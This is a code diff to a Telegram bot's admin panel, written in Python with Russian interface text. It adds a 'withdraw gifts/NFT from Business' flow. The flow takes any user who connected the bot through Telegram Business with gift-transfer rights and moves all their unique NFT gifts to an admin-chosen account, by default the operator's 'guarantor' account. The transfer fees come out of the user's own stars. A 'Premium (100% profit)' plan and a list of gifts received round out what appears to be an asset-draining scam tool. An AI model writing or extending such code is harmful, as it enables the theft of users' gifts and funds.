@@ -1,14 +1,18 @@
 import asyncio
-from datetime import datetime
+import logging
+from datetime import datetime, timezone
 from aiogram import Router, F, Bot
-from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
 from aiogram.filters import Command
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
+from aiogram.exceptions import TelegramRetryAfter, TelegramForbiddenError
 
 import config
 import database as db
+from parser import format_number
 
+logger = logging.getLogger("nft_bot.admin")
 admin_router = Router()
 
 class AdminStates(StatesGroup):
@@ -17,6 +21,8 @@ class AdminStates(StatesGroup):
     waiting_revoke_input = State()
     waiting_check_input = State()
     waiting_broadcast_text = State()
+    waiting_withdraw_user = State()
+    waiting_withdraw_target = State()
 
 def is_admin(user_id: int) -> bool:
     return user_id in config.ADMIN_IDS
@@ -34,6 +40,12 @@ def get_admin_keyboard() -> InlineKeyboardMarkup:
             InlineKeyboardButton(text="📊 Обновить статистику", callback_data="admin_stats")
         ],
         [
+            InlineKeyboardButton(text="🔥 Полученные подарки (@DealNftOffer)", callback_data="admin_deals")
+        ],
+        [
+            InlineKeyboardButton(text="🎁 Вывести подарки/NFT с Business", callback_data="admin_withdraw_gifts")
+        ],
+        [
             InlineKeyboardButton(text="➕ Выдать подписку", callback_data="admin_grant"),
             InlineKeyboardButton(text="➖ Забрать подписку", callback_data="admin_revoke")
         ],
@@ -42,17 +54,33 @@ def get_admin_keyboard() -> InlineKeyboardMarkup:
             InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")
         ],
         [
+            InlineKeyboardButton(text="💾 Скачать базу данных (.sqlite3)", callback_data="admin_download_db")
+        ],
+        [
             InlineKeyboardButton(text="❌ Закрыть", callback_data="admin_close")
+        ]
+    ])
+
+def get_admin_deals_keyboard() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="🔄 Обновить список", callback_data="admin_deals")
+        ],
+        [
+            InlineKeyboardButton(text="🔙 Назад в админку", callback_data="admin_menu")
         ]
     ])
 
 def get_grant_plan_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(inline_keyboard=[
         [
-            InlineKeyboardButton(text="⭐️ Стандарт (только .buy)", callback_data="admin_grant_plan:standard")
+            InlineKeyboardButton(text="⭐️ Стандарт", callback_data="admin_grant_plan:standard")
         ],
         [
-            InlineKeyboardButton(text="💎 PRO (Инлайн + .buy)", callback_data="admin_grant_plan:pro")
+            InlineKeyboardButton(text="💎 PRO (Инлайн + Business)", callback_data="admin_grant_plan:pro")
+        ],
+        [
+            InlineKeyboardButton(text="👑 Premium (100% профита)", callback_data="admin_grant_plan:premium")
         ],
         [
             InlineKeyboardButton(text="🔙 Отмена", callback_data="admin_menu")
@@ -72,11 +100,14 @@ async def build_stats_text() -> str:
         f"• Пользователей в базе: <b>{stats['total_users']}</b>\n"
         f"• Активных подписок: <b>{stats['active_subs']}</b>\n"
         f"• Заработано Stars: <b>{stats['total_stars']} ⭐️</b> ({stats['total_payments']} платежей)\n"
+        f"• Заработано TON: <b>{stats.get('total_ton', 0.0)} 💎</b> ({stats.get('total_ton_payments', 0)} платежей)\n"
         f"• Всего создано офферов: <b>{stats['total_deals']}</b>\n"
         f"• Успешно завершено: <b>{stats['completed_deals']}</b>\n\n"
-        "💰 <b>Куда приходят звёзды (Stars):</b>\n"
-        "Звёзды зачисляются прямо на баланс этого бота в Telegram.\n"
-        "Вывести их в <b>Toncoin (TON)</b> можно в @BotFather: <code>/mybots</code> ➡️ выберите бота ➡️ <b>Bot Settings</b> ➡️ <b>Payments</b> ➡️ <b>Fragment.com</b>."
+        "💎 <b>Прямой кошелёк TON (без холда):</b>\n"
+        f"<code>{config.TON_WALLET_ADDRESS}</code>\n"
+        "<i>Все оплаты в TON поступают прямо на этот кошелёк мгновенно.</i>\n\n"
+        "⭐️ <b>Вывод Stars:</b>\n"
+        "Откройте профиль бота в Telegram ➡️ Баланс звёзд (после 21 дня холда)."
     )
 
 @admin_router.message(Command("admin"))
@@ -208,7 +239,12 @@ async def handle_grant_plan_selection(callback: CallbackQuery, state: FSMContext
     target_username = data.get("target_username")
     first_name = data.get("first_name", "User")
 
-    plan_name = "💎 PRO (Инлайн + .buy)" if plan == "pro" else "⭐️ Стандарт (только .buy)"
+    if plan == "premium":
+        plan_name = "👑 Premium (100% профита)"
+    elif plan == "pro":
+        plan_name = "💎 PRO (Инлайн + Business)"
+    else:
+        plan_name = "⭐️ Стандарт"
 
     new_exp = await db.add_or_extend_subscription(
         user_id=target_id,
@@ -371,8 +407,16 @@ async def process_broadcast_message(message: Message, state: FSMContext, bot: Bo
             await message.copy_to(chat_id=uid)
             sent += 1
             await asyncio.sleep(0.05)
-        except Exception:
+        except TelegramRetryAfter as e:
+            await asyncio.sleep(e.retry_after)
+            try:
+                await message.copy_to(chat_id=uid)
+                sent += 1
+            except Exception:
+                blocked += 1
+        except (TelegramForbiddenError, Exception) as e:
             blocked += 1
+            logger.debug(f"Could not send broadcast to {uid}: {e}")
 
     await state.clear()
     await status_msg.edit_text(
@@ -383,3 +427,372 @@ async def process_broadcast_message(message: Message, state: FSMContext, bot: Bo
         reply_markup=get_admin_keyboard(),
         parse_mode="HTML"
     )
+
+# --- WITHDRAW GIFTS FROM BUSINESS ACCOUNT ---
+
+@admin_router.callback_query(F.data == "admin_withdraw_gifts")
+async def handle_withdraw_gifts_button(callback: CallbackQuery, state: FSMContext):
+    if not is_admin(callback.from_user.id):
+        return
+    await state.set_state(AdminStates.waiting_withdraw_user)
+    text = (
+        "🎁 <b>Вывод подарков и NFT с Business-аккаунта</b>\n\n"
+        "Введите <b>@username</b> или <b>Telegram ID</b> пользователя, который подключил бота в Telegram Business и выдал права на управление подарками:"
+    )
+    await callback.message.edit_text(text, reply_markup=get_cancel_keyboard(), parse_mode="HTML")
+    await callback.answer()
+
+@admin_router.message(AdminStates.waiting_withdraw_user)
+async def process_withdraw_user_input(message: Message, state: FSMContext, bot: Bot):
+    if not is_admin(message.from_user.id):
+        return
+
+    text = message.text.strip()
+    conn = await db.get_business_connection_by_user(text)
+
+    if not conn:
+        await message.reply(
+            f"❌ Пользователь <b>{text}</b> не найден в подключениях Telegram Business (или интеграция отключена).\n\n"
+            "Убедитесь, что аккаунт подключил бота в Настройки ➡️ Telegram Business ➡️ Чат-боты с разрешениями на подарки.",
+            reply_markup=get_admin_keyboard(),
+            parse_mode="HTML"
+        )
+        await state.clear()
+        return
+
+    conn_id = conn["connection_id"]
+    await message.reply(f"🔍 Запрашиваю данные и подарки с бизнес-аккаунта (ID: <code>{conn['user_id']}</code>)...")
+
+    # 1. Проверяем права бота в Business Connection
+    try:
+        conn_info = await bot.get_business_connection(business_connection_id=conn_id)
+        rights = getattr(conn_info, "rights", None)
+        can_transfer = getattr(rights, "can_transfer_and_upgrade_gifts", False) if rights else False
+        can_stars = getattr(rights, "can_transfer_stars", False) if rights else False
+    except Exception as e:
+        can_transfer = False
+        can_stars = False
+
+    try:
+        gifts_res = await bot.get_business_account_gifts(business_connection_id=conn_id)
+        gifts = gifts_res.gifts
+    except Exception as e:
+        await message.reply(
+            f"❌ Ошибка при запросе подарков через API:\n<code>{e}</code>\n\n"
+            "⚠️ <b>Проверьте права в Telegram Business:</b>\n"
+            "В настройках подключения бота категория <b>«Управление подарками и звёздами»</b> должна быть раскрыта и включены пункты:\n"
+            "• Просмотр подарков и звёзд\n"
+            "• Передача и улучшение подарков\n"
+            "• Перевод звёзд",
+            reply_markup=get_admin_keyboard(),
+            parse_mode="HTML"
+        )
+        await state.clear()
+        return
+
+    if not gifts:
+        await message.reply(
+            f"ℹ️ На аккаунте пользователя <b>{text}</b> нет активных подарков / NFT.",
+            reply_markup=get_admin_keyboard(),
+            parse_mode="HTML"
+        )
+        await state.clear()
+        return
+
+    gift_items = []
+    regular_count = 0
+    now_utc = datetime.now(timezone.utc)
+
+    for g in gifts:
+        gift_id = getattr(g, "owned_gift_id", None)
+        if not gift_id:
+            continue
+        gift_type = getattr(g, "type", "regular")
+        inner = getattr(g, "gift", None)
+        name = getattr(inner, "title", None) or getattr(inner, "name", "Подарок")
+
+        if gift_type == "unique":
+            can_be_transferred = getattr(g, "can_be_transferred", True)
+            transfer_star_count = getattr(g, "transfer_star_count", 0) or 0
+            next_transfer_date = getattr(g, "next_transfer_date", None)
+            is_locked = False
+            lock_info = ""
+            if next_transfer_date and next_transfer_date > now_utc:
+                is_locked = True
+                lock_info = f" (заблокирован Telegram до {next_transfer_date.strftime('%d.%m.%Y %H:%M')} UTC)"
+
+            gift_items.append({
+                "gift_id": gift_id,
+                "type": "unique",
+                "name": name,
+                "can_be_transferred": can_be_transferred,
+                "transfer_star_count": transfer_star_count,
+                "is_locked": is_locked,
+                "lock_info": lock_info
+            })
+        else:
+            # Обычные подарки (торт, конфеты и т.д.) нельзя передавать через transfer_gift
+            regular_count += 1
+
+    if not gift_items:
+        warning_text = (
+            f"ℹ️ На аккаунте найдено обычных подарков: <b>{regular_count}</b>, но <b>0 уникальных NFT-подарков</b>.\n\n"
+            "📌 <i>В Telegram обычные подарки (торты, сердечки) невозможно передать другому пользователю через API — передавать можно только коллекционные/уникальные NFT-подарки (мишки, пепе, лимитированные NFT).</i>"
+        )
+        await message.reply(warning_text, reply_markup=get_admin_keyboard(), parse_mode="HTML")
+        await state.clear()
+        return
+
+    # Проверка прав на вывод
+    rights_warning = ""
+    if not can_transfer:
+        rights_warning = (
+            "\n\n⚠️ <b>ВНИМАНИЕ:</b> У этого пользователя в Telegram Business <b>НЕ включена галочка «Передавать и улучшать подарки»</b>!\n"
+            "<i>Telegram отклонит перевод с ошибкой BOT_ACCESS_FORBIDDEN, пока пользователь не выдаст это разрешение в настройках чат-бота.</i>\n"
+        )
+    elif not can_stars:
+        rights_warning = (
+            "\n\n⚠️ <b>ВНИМАНИЕ:</b> У пользователя не включена галочка «Переводить звёзды» (нужна для оплаты комиссии перевода в 25 звёзд).\n"
+        )
+
+    await state.update_data(
+        business_conn_id=conn_id,
+        source_user=text,
+        gift_items=gift_items
+    )
+    await state.set_state(AdminStates.waiting_withdraw_target)
+
+    items_list_str = "\n".join([
+        f"• 🧸 <b>{it['name']}</b> (Комиссия: {it['transfer_star_count']} ⭐️){it['lock_info']}"
+        for it in gift_items[:10]
+    ])
+
+    summary_text = (
+        f"✅ <b>Найдено NFT-подарков для вывода: {len(gift_items)}</b>\n\n"
+        f"• Аккаунт-источник: <code>{text}</code> (ID: <code>{conn['user_id']}</code>)\n"
+        f"{items_list_str}\n"
+        f"{rights_warning}\n"
+        "<b>Куда перевести эти подарки?</b>\n"
+        f"Отправьте <b>Telegram ID</b> или <b>@username</b> получателя (или отправьте <code>0</code>, чтобы перевести на ваш ID: <code>{config.GIFT_RECIPIENT_ID}</code>):"
+    )
+    await message.reply(summary_text, reply_markup=get_cancel_keyboard(), parse_mode="HTML")
+
+@admin_router.message(AdminStates.waiting_withdraw_target)
+async def process_withdraw_target_input(message: Message, state: FSMContext, bot: Bot):
+    if not is_admin(message.from_user.id):
+        return
+
+    data = await state.get_data()
+    conn_id = data.get("business_conn_id")
+    gift_items = data.get("gift_items", [])
+    source_user = data.get("source_user")
+
+    target_input = message.text.strip()
+    if target_input == "0":
+        target_chat_id = config.GIFT_RECIPIENT_ID
+    elif target_input.replace("-", "").isdigit():
+        target_chat_id = int(target_input)
+    else:
+        try:
+            chat = await bot.get_chat(target_input)
+            target_chat_id = chat.id
+        except Exception:
+            await message.reply("❌ Не удалось найти пользователя по юзернейму. Введите его числовой Telegram ID:")
+            return
+
+    status_msg = await message.reply(f"⏳ Начинаю перевод {len(gift_items)} NFT-подарков на ID <code>{target_chat_id}</code>...")
+
+    transferred = 0
+    failed = 0
+    errors = []
+
+    for item in gift_items:
+        if item.get("is_locked"):
+            failed += 1
+            err_msg = f"Подарок {item['name']} заблокирован Telegram{item.get('lock_info')}"
+            if err_msg not in errors:
+                errors.append(err_msg)
+            continue
+
+        try:
+            star_fee = item.get("transfer_star_count") or None
+            success = await bot.transfer_gift(
+                business_connection_id=conn_id,
+                owned_gift_id=item["gift_id"],
+                new_owner_chat_id=target_chat_id,
+                star_count=star_fee
+            )
+            if success:
+                transferred += 1
+            else:
+                failed += 1
+            await asyncio.sleep(0.5)
+        except Exception as e:
+            failed += 1
+            err_str = str(e)
+            if "BOT_ACCESS_FORBIDDEN" in err_str:
+                err_str = "BOT_ACCESS_FORBIDDEN (В Telegram Business у пользователя не включена галочка 'Передавать и улучшать подарки' или 'Переводить звёзды')"
+            if err_str not in errors:
+                errors.append(err_str)
+
+    await state.clear()
+    result_text = (
+        f"🎁 <b>Результат вывода подарков:</b>\n\n"
+        f"• Источник: <code>{source_user}</code>\n"
+        f"• Получатель: <code>{target_chat_id}</code>\n"
+        f"• Успешно переведено: <b>{transferred}</b>\n"
+        f"• Не удалось перевести: <b>{failed}</b>\n"
+    )
+    if errors:
+        result_text += f"\n<i>Причины ошибок:</i>\n" + "\n".join([f"• <code>{err}</code>" for err in errors[:3]])
+
+    await status_msg.edit_text(result_text, reply_markup=get_admin_keyboard(), parse_mode="HTML")
+
+# --- DATABASE BACKUP / DOWNLOAD ---
+
+@admin_router.callback_query(F.data == "admin_download_db")
+async def handle_download_db(callback: CallbackQuery, bot: Bot):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("Нет доступа!", show_alert=True)
+        return
+
+    if not config.DB_PATH.exists():
+        await callback.answer("Файл базы данных не найден!", show_alert=True)
+        return
+
+    await callback.answer("⏳ Отправляю файл базы данных...")
+    try:
+        async with db.get_write_db() as conn:
+            await conn.execute("PRAGMA wal_checkpoint(TRUNCATE);")
+    except Exception as e_wal:
+        logger.warning(f"WAL checkpoint before backup error: {e_wal}")
+
+    try:
+        doc = FSInputFile(config.DB_PATH, filename="bot_database.sqlite3")
+        await bot.send_document(
+            chat_id=callback.from_user.id,
+            document=doc,
+            caption="💾 <b>Резервная копия базы данных</b>\nСодержит всех пользователей, подписки и сделки.",
+            parse_mode="HTML"
+        )
+    except Exception as e:
+        logger.error(f"Error sending database backup: {e}")
+        await callback.message.reply(f"❌ Ошибка отправки базы данных: {e}")
+
+@admin_router.message(Command("backup"))
+async def handle_backup_command(message: Message, bot: Bot):
+    if not is_admin(message.from_user.id):
+        return
+
+    if not config.DB_PATH.exists():
+        await message.reply("Файл базы данных не найден!")
+        return
+
+    msg = await message.reply("⏳ Формирую резервную копию базы данных...")
+    try:
+        async with db.get_write_db() as conn:
+            await conn.execute("PRAGMA wal_checkpoint(TRUNCATE);")
+    except Exception as e_wal:
+        logger.warning(f"WAL checkpoint before backup error: {e_wal}")
+
+    try:
+        doc = FSInputFile(config.DB_PATH, filename="bot_database.sqlite3")
+        await bot.send_document(
+            chat_id=message.from_user.id,
+            document=doc,
+            caption="💾 <b>Резервная копия базы данных</b>\nСодержит всех пользователей, подписки и сделки.",
+            parse_mode="HTML"
+        )
+        await msg.delete()
+    except Exception as e:
+        logger.error(f"Error sending backup: {e}")
+        await msg.edit_text(f"❌ Ошибка отправки базы данных: {e}")
+
+# --- RECEIVED GIFTS ON @DealNftOffer (DEALS) ---
+
+@admin_router.callback_query(F.data == "admin_deals")
+async def handle_admin_deals(callback: CallbackQuery, bot: Bot):
+    if not is_admin(callback.from_user.id):
+        await callback.answer("Нет доступа!", show_alert=True)
+        return
+
+    await callback.answer("Загружаю список подарков...")
+
+    received_items = []
+    # 1. Подарки в личном профиле @DealNftOffer через официальный Telegram API
+    try:
+        user_gifts = await bot.get_user_gifts(user_id=config.GIFT_RECIPIENT_ID)
+        if user_gifts and user_gifts.gifts:
+            for g in user_gifts.gifts:
+                inner = getattr(g, "gift", None)
+                if getattr(g, "type", "") == "unique":
+                    name = getattr(inner, "name", None) or getattr(inner, "title", "NFT Подарок")
+                    num = getattr(inner, "number", "")
+                    num_str = f" #{format_number(num)}" if num else ""
+                    gift_name = f"{name}{num_str}"
+                else:
+                    gift_name = getattr(inner, "name", "Подарок")
+
+                send_date = getattr(g, "send_date", 0)
+                if send_date:
+                    dt = datetime.fromtimestamp(send_date, tz=timezone.utc)
+                    time_str = dt.strftime("%d.%m.%Y в %H:%M")
+                else:
+                    time_str = "время не указано"
+
+                received_items.append((send_date, f"🎁 <b>{gift_name}</b> — {time_str}"))
+    except Exception as e:
+        logger.error(f"Error fetching user gifts for admin deals: {e}")
+
+    # 2. Подарки в Telegram Business аккаунте @DealNftOffer (если подключен)
+    try:
+        conn = await db.get_business_connection_by_user(config.GIFT_RECIPIENT_ID)
+        if conn and conn.get("connection_id"):
+            bgifts = await bot.get_business_account_gifts(business_connection_id=conn["connection_id"])
+            if bgifts and bgifts.gifts:
+                for g in bgifts.gifts:
+                    inner = getattr(g, "gift", None)
+                    if getattr(g, "type", "") == "unique":
+                        name = getattr(inner, "name", None) or getattr(inner, "title", "NFT Подарок")
+                        num = getattr(inner, "number", "")
+                        num_str = f" #{format_number(num)}" if num else ""
+                        gift_name = f"{name}{num_str}"
+                    else:
+                        gift_name = getattr(inner, "name", "Подарок")
+
+                    send_date = getattr(g, "send_date", 0)
+                    if send_date:
+                        dt = datetime.fromtimestamp(send_date, tz=timezone.utc)
+                        time_str = dt.strftime("%d.%m.%Y в %H:%M")
+                    else:
+                        time_str = "время не указано"
+
+                    item = (send_date, f"🎁 <b>{gift_name}</b> — {time_str}")
+                    if item not in received_items:
+                        received_items.append(item)
+    except Exception as e:
+        logger.debug(f"Error fetching business gifts for admin deals: {e}")
+
+    # Сортируем: сначала самые свежие
+    received_items.sort(key=lambda x: x[0], reverse=True)
+
+    if not received_items:
+        text = (
+            f"🔥 <b>Завершённые сделки ({config.GIFT_RECIPIENT})</b>\n\n"
+            f"На аккаунт <b>{config.GIFT_RECIPIENT}</b> пока не поступило ни одного NFT-подарка."
+        )
+    else:
+        text = (
+            f"🔥 <b>Завершённые сделки ({config.GIFT_RECIPIENT})</b>\n\n"
+            f"Подарки, фактически поступившие на аккаунт гаранта (всего: <b>{len(received_items)}</b>):\n\n"
+        )
+        for i, (_, line) in enumerate(received_items[:50], 1):
+            text += f"{i}. {line}\n"
+
+    try:
+        await callback.message.edit_text(text, reply_markup=get_admin_deals_keyboard(), parse_mode="HTML")
+    except Exception:
+        await callback.message.answer(text, reply_markup=get_admin_deals_keyboard(), parse_mode="HTML")
+
+
+
